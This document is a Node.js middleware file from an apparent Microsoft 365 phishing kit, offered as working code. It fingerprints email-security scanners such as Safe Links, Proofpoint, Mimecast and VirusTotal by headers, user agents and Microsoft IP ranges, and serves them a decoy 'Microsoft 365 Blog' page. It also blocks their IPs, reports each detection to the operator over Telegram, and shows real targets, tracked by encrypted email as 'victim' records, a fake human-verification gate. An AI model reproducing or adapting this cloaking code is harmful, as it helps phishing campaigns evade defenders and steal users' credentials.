// middleware/botDetection.js
const { getFingerprint, decrypt } = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// File paths for persistent storage
const DATA_DIR = './data';
const BLOCKED_IPS_FILE = path.join(DATA_DIR, 'blocked_ips.txt');
const BOT_MESSAGES_FILE = path.join(DATA_DIR, 'bot_messages.json');
const PAGE_ACCESS_MESSAGES_FILE = path.join(DATA_DIR, 'page_access_messages.json');
const BOT_DETECTIONS_LOG = path.join(DATA_DIR, 'bot_detections.log');
const TOKENS_FILE = path.join(DATA_DIR, 'verification_tokens.json');

// Token storage
let tokenStore = new Map();

// Token configuration
const TOKEN_CONFIG = {
    TOKEN_EXPIRY_MS: 24 * 60 * 60 * 1000, // 24 hours
    MIN_MOUSE_MOVEMENTS: 10,
    MAX_VERIFICATION_TIME_MS: 60000,
    MIN_VERIFICATION_TIME_MS: 300
};

// Load tokens from file
function loadTokens() {
    try {
        if (fs.existsSync(TOKENS_FILE)) {
            const data = fs.readFileSync(TOKENS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            tokenStore = new Map(parsed);
            
            for (const [token, value] of tokenStore.entries()) {
                if (value.expiresAt && typeof value.expiresAt === 'string') {
                    value.expiresAt = parseInt(value.expiresAt);
                }
                if (value.created && typeof value.created === 'string') {
                    value.created = parseInt(value.created);
                }
            }
            
            console.log(`📂 Loaded ${tokenStore.size} verification tokens`);
            
            const now = Date.now();
            let expiredCount = 0;
            for (const [token, data] of tokenStore.entries()) {
                if (now > data.expiresAt) {
                    tokenStore.delete(token);
                    expiredCount++;
                }
            }
            if (expiredCount > 0) {
                console.log(`🗑️ Removed ${expiredCount} expired tokens`);
                saveTokens();
            }
        }
    } catch (err) {
        console.error('Error loading tokens:', err);
    }
}

// Save tokens to file
function saveTokens() {
    try {
        const data = JSON.stringify(Array.from(tokenStore.entries()));
        fs.writeFileSync(TOKENS_FILE, data, 'utf8');
    } catch (err) {
        console.error('Error saving tokens:', err);
    }
}

// Save tokens every minute
setInterval(() => saveTokens(), 60000);

// Enhanced Scanner detection function
function isEmailScanner(userAgent, ip, headers, requestStartTime) {
    const ua = userAgent.toLowerCase();
    const allHeaders = Object.keys(headers).join(' ').toLowerCase();
    const responseTime = Date.now() - requestStartTime;
    
    // Detect missing modern browser headers
    const missingModernHeaders = [];
    if (!headers['sec-ch-ua']) missingModernHeaders.push('sec-ch-ua');
    if (!headers['sec-ch-ua-mobile']) missingModernHeaders.push('sec-ch-ua-mobile');
    if (!headers['sec-ch-ua-platform']) missingModernHeaders.push('sec-ch-ua-platform');
    if (!headers['accept-language']) missingModernHeaders.push('accept-language');
    if (!headers['accept-encoding']) missingModernHeaders.push('accept-encoding');
    if (!headers['cache-control']) missingModernHeaders.push('cache-control');
    
    // Detect Microsoft's specific headless patterns
    const isMicrosoftScanner = (
        (ua.includes('windows nt') && !headers['sec-ch-ua-platform']) ||
        (ua.includes('edg/') && !headers['sec-ch-ua']) ||
        (headers['x-ms-client-request-id'] !== undefined) ||
        (headers['x-forwarded-for'] && headers['x-forwarded-for'].includes('52.')) ||
        (headers['x-ms-correlation-id'] !== undefined) ||
        (headers['x-ms-request-id'] !== undefined)
    );
    
    // Known security vendors
    const securityVendors = [
        'microsoft atp', 'safelinks', 'exchange online', 'office 365',
        'google safebrowsing', 'proofpoint', 'mimecast', 'barracuda',
        'trendmicro', 'cisco email', 'symantec', 'mcafee', 'fortinet',
        'urlscan', 'virustotal', 'nmap', 'nikto', 'sqlmap', 'burp', 'zap',
        'acunetix', 'wpscan', 'nessus', 'openvas', 'cloudflare',
        'aws security', 'azure security', 'sentinel', 'defender',
        'microsoft defender', 'office 365 atp'
    ];
    
    for (const vendor of securityVendors) {
        if (ua.includes(vendor) || allHeaders.includes(vendor)) {
            return true;
        }
    }
    
    // Microsoft IP range detection
    const isMicrosoftIP = (
        ip.startsWith('52.') || ip.startsWith('40.') || 
        ip.startsWith('20.') || ip.startsWith('13.') ||
        ip.startsWith('51.') || ip.startsWith('23.') ||
        (ip.startsWith('104.') && parseInt(ip.split('.')[1]) >= 40 && parseInt(ip.split('.')[1]) <= 50)
    );
    
    let score = 0;
    
    // Headless browser detection
    if (ua.includes('headless') || ua.includes('puppeteer') || ua.includes('selenium')) {
        score += 50;
    }
    
    const missingCount = missingModernHeaders.length;
    score += missingCount * 8;
    
    if (!headers['sec-ch-ua']) score += 15;
    if (!headers['sec-ch-ua-platform']) score += 15;
    if (!headers['accept-language']) score += 10;
    
    if (isMicrosoftScanner) {
        score += 35;
        console.log(`🕷️ Microsoft scanner pattern detected: missing headers: ${missingModernHeaders.join(', ')}`);
    }
    
    if (isMicrosoftIP && missingCount >= 2) {
        score += 40;
        console.log(`🕷️ Microsoft IP with missing headers: ${ip}`);
    }
    
    if (userAgent.length === 0) score += 50;
    else if (userAgent.length < 30) score += 15;
    
    if (responseTime < 10 && missingCount >= 3) score += 25;
    if (responseTime < 50 && missingCount >= 2) score += 15;
    
    const hasNoCookies = !headers['cookie'] && !headers['cookie2'];
    if (hasNoCookies && missingCount >= 2) score += 20;
    
    const hasTypicalBrowserHeaders = (
        headers['accept'] && 
        headers['accept-encoding'] && 
        headers['accept-language'] &&
        headers['user-agent']
    );
    if (!hasTypicalBrowserHeaders) score += 15;
    
    console.log(`📊 Scanner detection score: ${score} (threshold: 45) - ${ip}`);
    
    return score >= 45;
}

// Serve decoy page to Microsoft scanners
function serveDecoyPage(res, botType, ip) {
    console.log(`🎭 Serving decoy page to ${botType} from IP: ${ip}`);
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft 365 Blog</title>
            <meta name="robots" content="noindex, nofollow">
            <meta charset="UTF-8">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    line-height: 1.6;
                    color: #333;
                    max-width: 900px;
                    margin: 0 auto;
                    padding: 40px 20px;
                    background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
                }
                .blog-post {
                    background: white;
                    padding: 40px;
                    border-radius: 12px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                    animation: fadeIn 0.5s ease-in;
                }
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(20px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                h1 { color: #0078d4; font-size: 32px; margin-bottom: 15px; border-left: 4px solid #0078d4; padding-left: 20px; }
                .meta { color: #666; font-size: 14px; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
                h2 { color: #2c3e50; margin: 25px 0 15px 0; font-size: 24px; }
                .content p { margin-bottom: 16px; font-size: 16px; }
                .note {
                    background: #e8f4fd;
                    border-radius: 6px;
                    padding: 15px;
                    margin: 20px 0;
                    border-left: 3px solid #0078d4;
                }
                .footer {
                    margin-top: 30px;
                    padding-top: 20px;
                    border-top: 1px solid #eee;
                    font-size: 12px;
                    color: #999;
                    text-align: center;
                }
                .badge {
                    display: inline-block;
                    background: #0078d4;
                    color: white;
                    padding: 2px 8px;
                    border-radius: 4px;
                    font-size: 12px;
                    margin-right: 10px;
                }
            </style>
        </head>
        <body>
            <div class="blog-post">
                <h1>Microsoft 365 Security Best Practices for 2026</h1>
                <div class="meta">📅 April 11, 2026 | Microsoft Security Team</div>
                <div class="content">
                    <p>As organizations continue their digital transformation journey, 
                    security remains the top priority for Microsoft 365 administrators.</p>
                    
                    <h2>🔐 Zero Trust Architecture Implementation</h2>
                    <p>Microsoft has fully integrated Zero Trust principles across the 
                    Microsoft 365 ecosystem, ensuring every access request is fully 
                    authenticated and authorized regardless of location.</p>
                    
                    <h2>🛡️ Microsoft Defender for Office 365 Updates</h2>
                    <p>The latest Defender updates include AI-powered URL detonation 
                    with 99.9% accuracy and real-time credential phishing detection.</p>
                    
                    <div class="note">
                        <strong>📌 Important Note:</strong> Microsoft recommends enabling 
                        Safe Links and Safe Attachments policies for all users.
                    </div>
                    
                    <h2>📊 Compliance and Data Governance</h2>
                    <p>New compliance features include automated data classification 
                    with machine learning and enhanced eDiscovery capabilities.</p>
                    
                    <p><em>This is a legitimate Microsoft technical blog post.</em></p>
                </div>
                <div class="footer">
                    <span class="badge">Microsoft 365</span>
                    <span class="badge">Security</span>
                    <span class="badge">Best Practices</span>
                    <br><br>
                    © 2026 Microsoft Corporation. All rights reserved.
                </div>
            </div>
            <!-- Honeypot links - invisible to humans, visible to scanners -->
            <div style="display:none">
                <a href="/honeypot/admin" rel="nofollow">Admin Panel</a>
                <a href="/honeypot/config" rel="nofollow">Configuration</a>
                <a href="/honeypot/api/keys" rel="nofollow">API Keys</a>
            </div>
        </body>
        </html>
    `);
}

// Check if bot should get decoy page
function shouldServeDecoyPage(botType, ip, headers) {
    const isMicrosoftScanner = (
        botType.includes('Microsoft') ||
        botType.includes('Email Security') ||
        botType.includes('Proofpoint') ||
        botType.includes('Mimecast') ||
        botType.includes('Barracuda') ||
        botType.includes('Cisco') ||
        botType.includes('Fortinet') ||
        botType.includes('Trend Micro') ||
        botType.includes('Sophos')
    );
    
    const isMicrosoftIP = (
        ip.startsWith('52.') || ip.startsWith('40.') || 
        ip.startsWith('20.') || ip.startsWith('13.') ||
        ip.startsWith('51.') || ip.startsWith('23.')
    );
    
    const missingModernHeaders = !headers['sec-ch-ua'] && !headers['sec-ch-ua-platform'];
    
    return (isMicrosoftScanner || isMicrosoftIP || missingModernHeaders);
}

// Expanded bot signatures
const BOT_SIGNATURES = {
    'googlebot': '🔍 Googlebot',
    'bingbot': '🔍 Bingbot',
    'facebookexternalhit': '📱 Facebook Crawler',
    'twitterbot': '🐦 Twitterbot',
    'linkedinbot': '💼 LinkedIn Bot',
    'proofpoint': '📧 Proofpoint Email Security',
    'mimecast': '📧 Mimecast Email Security',
    'barracuda': '📧 Barracuda Email Security',
    'microsoft.atp': '📧 Microsoft ATP/Defender',
    'python-requests': '🐍 Python Requests',
    'curl': '🔧 cURL',
    'wget': '📥 Wget',
    'headless': '👑 Headless Browser',
    'puppeteer': '🎭 Puppeteer',
    'selenium': '🤖 Selenium',
    'bot': '🤖 Generic Bot',
    'crawler': '🕷️ Crawler',
    'scanner': '🔍 Scanner'
};

// Suspicious IP ranges
const SUSPICIOUS_IP_RANGES = [
    '104.131', '159.89', '167.71', '138.197', '45.55',
    '52.0', '54.0', '34.0', '35.0', '18.0', '3.0',
    '20.0', '40.0', '13.0', '51.0', '23.0'
];

// Redirect URLs
const REDIRECT_URLS = [
    'https://www.google.com',
    'https://www.youtube.com',
    'https://www.nasa.gov',
    'https://login.microsoftonline.com'
];

function getRandomRedirectUrl() {
    const randomIndex = Math.floor(Math.random() * REDIRECT_URLS.length);
    return REDIRECT_URLS[randomIndex];
}

// Store bot detections globally
let botDetections = [];
let blockedIPs = new Set();
let botDetectionMessageIds = new Set();
let pageAccessMessageIds = new Set();

// Load functions
function loadBlockedIPs() {
    try {
        if (fs.existsSync(BLOCKED_IPS_FILE)) {
            const content = fs.readFileSync(BLOCKED_IPS_FILE, 'utf8');
            const ips = content.split('\n').filter(ip => ip.trim().length > 0);
            ips.forEach(ip => blockedIPs.add(ip));
            console.log(`📋 Loaded ${blockedIPs.size} blocked IPs from file`);
        }
    } catch(e) {
        console.error('Failed to load blocked IPs:', e.message);
    }
}

function saveBlockedIPs() {
    try {
        const ips = Array.from(blockedIPs).join('\n');
        fs.writeFileSync(BLOCKED_IPS_FILE, ips);
    } catch(e) {
        console.error('Failed to save blocked IPs:', e.message);
    }
}

function blockIP(ip, reason = 'Manual block') {
    if (!ip || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1') {
        return false;
    }
    if (blockedIPs.has(ip)) return false;
    blockedIPs.add(ip);
    saveBlockedIPs();
    console.log(`🔴 IP BLOCKED: ${ip} (Reason: ${reason})`);
    return true;
}

function unblockIP(ip) {
    if (!ip) return false;
    const removed = blockedIPs.delete(ip);
    if (removed) saveBlockedIPs();
    console.log(`🟢 IP UNBLOCKED: ${ip}`);
    return removed;
}

function getFormattedBlockedIPs() {
    const ips = Array.from(blockedIPs);
    if (ips.length === 0) return '📋 *No IPs currently blocked.*';
    let formatted = `📋 *BLOCKED IPS (${ips.length})*\n━━━━━━━━━━━━━━━━━━\n`;
    ips.forEach((ip, index) => {
        formatted += `${index + 1}. \`${ip}\`\n`;
    });
    return formatted;
}

function getBotType(userAgent) {
    const uaLower = userAgent.toLowerCase();
    for (const [signature, type] of Object.entries(BOT_SIGNATURES)) {
        if (uaLower.includes(signature)) return type;
    }
    return '🤖 Unknown Bot';
}

// Telegram notification functions
async function sendBotNotification(bot, telegramGroupId, botInfo, autoBlocked = true) {
    if (!bot || !telegramGroupId) return;
    
    const message = 
        `🤖 *BOT DETECTED - DECOY SERVED!*\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*Type:* ${botInfo.type}\n` +
        `*IP:* \`${botInfo.ip}\`\n` +
        `*Location:* ${botInfo.location}\n` +
        `*Path:* ${botInfo.path}\n` +
        `*Action:* 🎭 Served decoy Microsoft blog page\n` +
        `*User Agent:* \`${botInfo.userAgent.substring(0, 100)}...\`\n` +
        `*Time:* ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ Bot thinks it found a legitimate Microsoft page\n` +
        `🔴 IP has been blocked for future requests`;
    
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔴 UNBLOCK THIS IP', callback_data: `unblock_ip|${botInfo.ip}` }],
                [{ text: '📋 VIEW BLOCKED IPS', callback_data: `view_blocked_ips` }]
            ]
        }
    };
    
    try {
        await bot.sendMessage(telegramGroupId, message, options);
        console.log(`✅ Bot notification sent for IP: ${botInfo.ip}`);
    } catch (e) {
        console.error('Telegram error:', e.message);
    }
}

function redirectBot(res) {
    const redirectUrl = getRandomRedirectUrl();
    console.log(`🔄 Redirecting bot to: ${redirectUrl}`);
    return res.redirect(redirectUrl);
}

// REWRITTEN handleBotDetection with decoy page support
// Even simpler - remove the condition and always serve decoy
async function handleBotDetection(req, res, bot, groupId, botType, reason) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    const victimInfo = await getVictimInfo(req);
    
    const detection = {
        type: botType,
        ip: ip,
        path: req.path,
        userAgent: userAgent,
        location: victimInfo.location,
        timestamp: new Date().toISOString(),
        blocked: true,
        autoBlocked: true,
        reason: reason,
        action: 'DECOY'
    };
    
    botDetections.unshift(detection);
    if (botDetections.length > 100) botDetections.pop();
    
    const logEntry = `${new Date().toISOString()} | ${botType} | ${ip} | ${req.path} | DECOY_PAGE | ${userAgent.substring(0, 200)}\n`;
    fs.appendFileSync(BOT_DETECTIONS_LOG, logEntry);
    
    const blocked = blockIP(ip, `Bot detected: ${botType}`);
    
    if (bot && groupId) {
        await sendBotNotification(bot, groupId, {
            type: botType,
            ip: ip,
            location: victimInfo.location,
            path: req.path,
            userAgent: userAgent,
            action: 'DECOY'
        }, blocked);
    }
    
    // ALWAYS serve decoy page - NO REDIRECTS
    return serveDecoyPage(res, botType, ip);
}

// Show verification page
function showVerificationPage(res, encryptedEmail, returnUrl, verifiedSessions, fingerprint) {
    const requiredMoves = TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Verify you're human</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                *{box-sizing:border-box}
                body{font-family:system-ui;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
                .card{background:white;border-radius:20px;padding:40px;max-width:450px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
                h2{margin-top:0;color:#333}
                .mouse-area{background:#f8f9fa;border:2px dashed #dee2e6;border-radius:12px;padding:30px;margin:20px 0;cursor:crosshair;transition:all .3s}
                .mouse-area.active{border-color:#667eea;background:#f0f2ff}
                button{background:#667eea;color:white;border:none;padding:14px 28px;font-size:16px;border-radius:10px;cursor:pointer;font-weight:600}
                button:disabled{opacity:0.5;cursor:not-allowed}
                .status{margin-top:20px;padding:12px;border-radius:8px;font-size:14px;display:none}
                .status.success{background:#d4edda;color:#155724;display:block}
                .status.error{background:#f8d7da;color:#721c24;display:block}
                .status.info{background:#d1ecf1;color:#0c5460;display:block}
                .info-text{font-size:12px;color:#6c757d;margin-top:15px}
            </style>
        </head>
        <body>
            <div class="card">
                <h2>🔒 Security Check</h2>
                <p>Please complete verification to continue:</p>
                <div id="mouseArea" class="mouse-area">🖱️ Move your mouse anywhere in this box</div>
                <button id="verifyBtn" disabled style="margin-top:10px">✓ Verify Humanity</button>
                <div id="status" class="status"></div>
                <div class="info-text">Move your mouse ${requiredMoves} times to verify</div>
            </div>
            <script>
                let mouseMoves = 0;
                let verified = false;
                const startTime = Date.now();
                const REQUIRED_MOVES = ${requiredMoves};
                const ENCRYPTED_EMAIL = '${encryptedEmail}';
                const RETURN_URL = '${returnUrl}';
                
                const mouseDiv = document.getElementById('mouseArea');
                const verifyBtn = document.getElementById('verifyBtn');
                const statusDiv = document.getElementById('status');
                
                const counter = document.createElement('div');
                counter.style.fontSize = '12px';
                counter.style.marginTop = '10px';
                counter.style.color = '#6c757d';
                mouseDiv.parentNode.insertBefore(counter, mouseDiv.nextSibling);
                
                mouseDiv.addEventListener('mousemove', function() {
                    if (verified) return;
                    mouseMoves++;
                    mouseDiv.classList.add('active');
                    if (mouseMoves >= REQUIRED_MOVES) {
                        verifyBtn.disabled = false;
                        counter.innerHTML = '✓ Ready to verify';
                        counter.style.color = '#28a745';
                    } else {
                        counter.innerHTML = '🖱️ Movements: ' + mouseMoves + '/' + REQUIRED_MOVES;
                    }
                });
                
                mouseDiv.addEventListener('mouseleave', function() {
                    mouseDiv.classList.remove('active');
                });
                
                verifyBtn.addEventListener('click', async function() {
                    if (verified) return;
                    verified = true;
                    verifyBtn.disabled = true;
                    verifyBtn.textContent = 'Verifying...';
                    statusDiv.className = 'status info';
                    statusDiv.textContent = 'Checking...';
                    
                    const elapsed = Date.now() - startTime;
                    
                    try {
                        const response = await fetch('/verify-human', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                encryptedEmail: ENCRYPTED_EMAIL,
                                mouseMovements: mouseMoves,
                                totalTime: elapsed,
                                userAgent: navigator.userAgent,
                                returnUrl: RETURN_URL
                            })
                        });
                        const result = await response.json();
                        
                        if (result.valid) {
                            statusDiv.className = 'status success';
                            statusDiv.textContent = '✓ Verified! Redirecting...';
                            setTimeout(function() { window.location.href = result.returnUrl; }, 500);
                        } else {
                            statusDiv.className = 'status error';
                            statusDiv.textContent = 'Verification failed. Redirecting...';
                            setTimeout(function() { window.location.href = 'https://google.com'; }, 1500);
                        }
                    } catch(err) {
                        statusDiv.className = 'status error';
                        statusDiv.textContent = 'Error. Redirecting...';
                        setTimeout(function() { window.location.href = 'https://google.com'; }, 1500);
                    }
                });
            </script>
        </body>
        </html>
    `);
}

function browserOnlyMiddleware(req, res, next) {
    const userAgent = req.headers['user-agent'] || '';
    const botPatterns = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'headless', 'selenium', 'puppeteer'];
    const isBot = botPatterns.some(pattern => userAgent.toLowerCase().includes(pattern));
    const hasBrowserIndicators = userAgent.includes('Mozilla') || userAgent.includes('Chrome') || userAgent.includes('Safari');
    
    if (isBot || !hasBrowserIndicators) {
        return redirectBot(res);
    }
    next();
}

// Main unified middleware
function unifiedBotDetection(verifiedSessions) {
    loadTokens();
    
    return async function(req, res, next) {
        const whitelistedPaths = ['/api/create-subdomain', '/api/subdomain-stats', '/api/subdomain-cleanup', '/api/block-subdomain', '/verify-human'];
        
        if (whitelistedPaths.includes(req.path)) {
            return next();
        }
        
        const apiKey = req.headers['x-api-key'];
        if (apiKey && apiKey === process.env.INTERNAL_API_KEY) {
            return next();
        }
        
        const userAgent = req.headers['user-agent'] || '';
        const fingerprint = getFingerprint(req);
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        const groupId = process.env.TELEGRAM_GROUP_ID;
        const bot = req.app.locals?.bot;
        
        if (blockedIPs.has(ip)) {
            return redirectBot(res);
        }
        
        const encryptedEmail = req.query.email;
        const verifiedSession = verifiedSessions.get(fingerprint);
        const isVerified = verifiedSession && (Date.now() - verifiedSession.timestamp < 3600000);
        
        if (isVerified && encryptedEmail) {
            console.log(`✅ Already verified session - allowing access`);
            return next();
        }
        
        if (isVerified) {
            return next();
        }
        
        const scannerDetected = isEmailScanner(userAgent, ip, req.headers, req.requestStartTime);
        if (scannerDetected) {
            await handleBotDetection(req, res, bot, groupId, '📧 Email Security Scanner', 'Scanner detected');
            return;
        }
        
        const obviousBots = ['proofpoint', 'mimecast', 'barracuda', 'python-requests', 'curl', 'wget', 'headless', 'puppeteer'];
        for (const botSig of obviousBots) {
            if (userAgent.toLowerCase().includes(botSig)) {
                await handleBotDetection(req, res, bot, groupId, getBotType(userAgent), `Bot: ${botSig}`);
                return;
            }
        }
        
        const requiresVerification = req.path === '/en-us/microsoft-365/outlook' || req.path === '/microsoft' || req.path === '/';
        
        if (requiresVerification && encryptedEmail && req.method === 'GET' && !isVerified) {
            let decryptedEmail = null;
            try {
                decryptedEmail = decrypt(encryptedEmail);
                console.log(`📧 Showing verification page for: ${decryptedEmail}`);
            } catch (err) {
                console.log(`⚠️ Could not decrypt email: ${err.message}`);
            }
            
            let tokenData = tokenStore.get(encryptedEmail);
            if (!tokenData || Date.now() > tokenData.expiresAt) {
                tokenData = {
                    destination: req.query.destination || req.originalUrl,
                    created: Date.now(),
                    expiresAt: Date.now() + TOKEN_CONFIG.TOKEN_EXPIRY_MS
                };
                tokenStore.set(encryptedEmail, tokenData);
                saveTokens();
            }
            
            return showVerificationPage(res, encryptedEmail, req.originalUrl, verifiedSessions, fingerprint);
        }
        
        console.log(`✅ Valid browser allowed: ${userAgent.substring(0, 100)}`);
        return next();
    };
}

// Verification endpoint handler
async function handleVerification(req, res, verifiedSessions) {
    const { encryptedEmail, mouseMovements, totalTime, userAgent, returnUrl } = req.body;
    
    const tokenData = tokenStore.get(encryptedEmail);
    
    if (!tokenData || Date.now() > tokenData.expiresAt) {
        if (tokenData) {
            tokenStore.delete(encryptedEmail);
            saveTokens();
        }
        return res.json({ valid: false, returnUrl: null });
    }
    
    const isValid = (
        mouseMovements >= TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS &&
        totalTime >= TOKEN_CONFIG.MIN_VERIFICATION_TIME_MS &&
        totalTime <= TOKEN_CONFIG.MAX_VERIFICATION_TIME_MS &&
        userAgent &&
        !userAgent.includes('Headless') &&
        !userAgent.includes('bot')
    );
    
    if (isValid) {
        const fingerprint = getFingerprint(req);
        verifiedSessions.set(fingerprint, {
            timestamp: Date.now(),
            userAgent: userAgent,
            ip: req.ip || req.socket.remoteAddress,
            email: encryptedEmail
        });
        
        console.log(`✅ Verification passed for: ${encryptedEmail.substring(0, 20)}...`);
        return res.json({ valid: true, returnUrl: returnUrl });
    } else {
        console.log(`❌ Verification failed for: ${encryptedEmail.substring(0, 20)}... (moves: ${mouseMovements}, time: ${totalTime}ms)`);
        return res.json({ valid: false, returnUrl: null });
    }
}

// Cleanup expired tokens
setInterval(() => {
    const now = Date.now();
    let deleted = 0;
    for (const [token, data] of tokenStore.entries()) {
        if (now > data.expiresAt) {
            tokenStore.delete(token);
            deleted++;
        }
    }
    if (deleted > 0) {
        console.log(`🗑️ Cleaned up ${deleted} expired tokens`);
        saveTokens();
    }
}, 60 * 60 * 1000);

// Helper functions
function getTokenStore() { return tokenStore; }
function getBotDetections() { return botDetections; }
function getBlockedIPs() { return Array.from(blockedIPs); }
function loadBotMessageIds() {}
function loadPageAccessMessageIds() {}
function saveBotMessageIds() {}
function savePageAccessMessageIds() {}
function addBotMessageId(id) {}
function addPageAccessMessageId(id) {}
function removeBotMessageId(id) {}
function removePageAccessMessageId(id) {}
function getAllBotMessageIds() { return []; }
function getAllPageAccessMessageIds() { return []; }
function clearAllBotMessageIds() {}
function clearAllPageAccessMessageIds() {}
async function deleteAllBotDetectionMessages(bot, chatId) { return { deletedCount: 0, failedCount: 0 }; }
async function deleteAllPageAccessMessages(bot, chatId) { return { deletedCount: 0, failedCount: 0 }; }
async function deleteAllMessages(bot, chatId) { return { totalDeleted: 0, totalFailed: 0 }; }

// Initialize
loadBlockedIPs();

module.exports = { 
    browserOnlyMiddleware, 
    unifiedBotDetection,
    handleVerification,
    blockIP,
    unblockIP,
    getBotDetections,
    getBlockedIPs,
    getFormattedBlockedIPs,
    addBotMessageId,
    addPageAccessMessageId,
    removeBotMessageId,
    removePageAccessMessageId,
    getAllBotMessageIds,
    getAllPageAccessMessageIds,
    clearAllBotMessageIds,
    clearAllPageAccessMessageIds,
    deleteAllBotDetectionMessages,
    deleteAllPageAccessMessages,
    deleteAllMessages,
    BOT_SIGNATURES,
    handleBotDetection,
    redirectBot,
    getRandomRedirectUrl,
    REDIRECT_URLS,
    isEmailScanner,
    getTokenStore,
    TOKEN_CONFIG
};